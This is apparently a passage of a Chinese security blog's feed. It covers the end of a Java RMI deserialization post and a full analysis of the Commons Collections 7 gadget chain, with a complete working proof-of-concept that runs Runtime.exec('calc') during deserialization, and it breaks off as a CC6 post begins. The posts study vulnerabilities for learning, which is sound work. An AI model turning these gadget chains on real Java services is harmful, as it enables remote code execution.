class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Retention.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端运行结果</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220616222718778-410745754.png" alt="image-20220616222718134"></p><p>之所以会弹出计算器，前面有提到过RMI在传输数据的时候，会被序列化，传输的是序列化后的数据，在传输完成后再进行反序列化。那么这时候如果传输一个恶意的序列化数据就会进行反序列化的命令执行。</p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>对RMI做了简单的了解和使用，后续会对RMI的底层进行分析…</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">https://www.cnblogs.com/nice0e3/p/13927460.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt; Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="RMI" scheme="https://kpa1on.github.io/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections7分析</title>
    <link href="https://kpa1on.github.io/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections7%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections7%E5%88%86%E6%9E%90/</id>
    <published>2022-06-05T02:37:44.000Z</published>
    <updated>2022-06-05T05:17:20.298Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>该链和CC6类似，不过CC7利用链中是使用<code>Hashtable</code>作为反序列化的入口点。</p><span id="more"></span><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject</span><br><span class="line">Hashtable.reconstitutionPut</span><br><span class="line">Hashtable.reconstitutionPut</span><br><span class="line">  LazyMap.equals 没实现，找父类</span><br><span class="line">     AbstractMapDecorator.equals</span><br><span class="line">        HashMap.equals 没实现，找父类</span><br><span class="line">           AbstractMap.equals</span><br><span class="line">              LazyMap.get</span><br><span class="line">   ChainedTransformer.transform()</span><br><span class="line">        ConstantTransformer.transform()</span><br><span class="line"> InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test1.out&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test1.out&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"><span class="comment">//            return hashtable;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先看下<code>Hashtable</code>序列化过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//临时变量（栈）</span></span><br><span class="line">      Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">          s.defaultWriteObject();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//写入table的容量</span></span><br><span class="line">          s.writeInt(table.length);</span><br><span class="line"><span class="comment">//写入table的元素个数</span></span><br><span class="line">          s.writeInt(count);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">//取出table中的元素，放入栈中（entryStack）</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">              Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"> </span><br><span class="line">              <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                  entryStack =</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                  entry = entry.next;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//依次写入栈中的每个元素</span></span><br><span class="line">      <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">          s.writeObject(entryStack.key);</span><br><span class="line">          s.writeObject(entryStack.value);</span><br><span class="line">          entryStack = entryStack.next;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Hashtable有一个Entry<?,?>[]类型的table属性，用于存放元素（键值对）。Hashtable在序列化时会先把table数组的容量和table数组中的元素个数写入到序列化流中，然后将table数组中的元素取出写入到序列化流中。</p><p>再来看Hashtable的反序列化流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">       s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 读取table数组的容量</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"><span class="comment">//读取table数组的元素个数</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算table数组的length</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">       <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">           length--;</span><br><span class="line">       <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">           length = origlength;</span><br><span class="line"><span class="comment">//根据length创建table数组</span></span><br><span class="line">       table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">       threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">       count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化，还原table数组</span></span><br><span class="line">       <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">           <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">               <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">           <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">               <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">           reconstitutionPut(table, key, value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Hashtable会先从反序列化流中读取table数组的容量和元素个数，根据origlength 和elements 计算出table数组的length，根据length来创建table数组，然后从反序列化流中依次读取每个元素，再调用reconstitutionPut方法将元素重新放入table数组（Hashtable的table属性），最终完成反序列化。</p><p>我们分析一下reconstitutionPut方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="keyword">throws</span> StreamCorruptedException &#123;</span><br><span class="line"><span class="comment">//value不能为null</span></span><br><span class="line">       <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重新计算key的hash值</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line"><span class="comment">//根据hash值计算存储索引</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line"><span class="comment">//判断元素的key是否重复</span></span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line"><span class="comment">//如果key重复则抛出异常</span></span><br><span class="line">           <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//key不重复则将元素添加到table数组中</span></span><br><span class="line">       <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">           Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">       tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">       count++;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>reconstitutionPut方法首先对value进行不为null的校验，否则抛出反序列化异常，然后根据key计算出元素在table数组中的存储索引，判断元素在table数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成Entry并添加到table数组中。</p><p>CC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在判断重复元素的时候校验了两个元素的hash值是否一样，然后接着key会调用equals方法判断key是否重复时就会触发漏洞。</p><p>跟进<code>e.key.equals()</code>，发现调用的是LazyMap的equals方法，但是LazyMap中并没有equals方法，实际上是调用了LazyMap的父类AbstractMapDecorator的equals方法，虽然AbstractMapDecorator是一个抽象类，但它实现了equals方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line"><span class="comment">//是否为同一对象（比较引用）</span></span><br><span class="line"><span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用HashMap的equals方法</span></span><br><span class="line"><span class="keyword">return</span> map.equals(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们通过LazyMap的decorate()方法将HashMap传给了map属性，因此这里会调用HashMap的equals方法。而HashMap中不存在equals方法，但HashMap继承了AbstractMap抽象类，该类中有一个equals方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line"><span class="comment">//是否为同一对象</span></span><br><span class="line">      <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//运行类型是否不是Map</span></span><br><span class="line">      <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//向上转型</span></span><br><span class="line">      Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line"><span class="comment">//判断HashMap的元素的个数size</span></span><br><span class="line">      <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获取HashMap的迭代器</span></span><br><span class="line">          Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">          <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line"><span class="comment">//获取每个元素（Node）</span></span><br><span class="line">              Entry&lt;K,V&gt; e = i.next();</span><br><span class="line"><span class="comment">//获取key和value</span></span><br><span class="line">              <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">              <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line"><span class="comment">//如果value为null，则判断key</span></span><br><span class="line">              <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//如果value不为null，判断value内容是否相同</span></span><br><span class="line">                  <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中m对象本质上是一个LazyMap，LazyMap的get方法内部会判断当前传入的key是否已存在，如果不在则会进入if语句中调用transform方法，从而产生漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">     <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">     <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="comment">//构造命令执行环境</span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">         map.put(key, value);</span><br><span class="line">         <span class="keyword">return</span> value;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> map.get(key);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_35733751/article/details/119862728">https://blog.csdn.net/qq_35733751/article/details/119862728</a></p><p><a href="https://www.freebuf.com/vuls/330087.html">https://www.freebuf.com/vuls/330087.html</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13910833.html">https://www.cnblogs.com/nice0e3/p/13910833.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;该链和CC6类似，不过CC7利用链中是使用&lt;code&gt;Hashtable&lt;/code&gt;作为反序列化的入口点。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections6分析</title>
    <link href="https://kpa1on.github.io/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections6%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections6%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T16:31:07.000Z</published>
    <updated>2022-06-04T18:40:58.396Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC6链中和CC5的利用链类似，只是CC6链中使用的是<code>HashSet</code>去触发<code>LazyMap</code>的get方法，而在CC5中使用的是<code>BadAttributeValueExpException</code>。</p><span id="more"></span><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 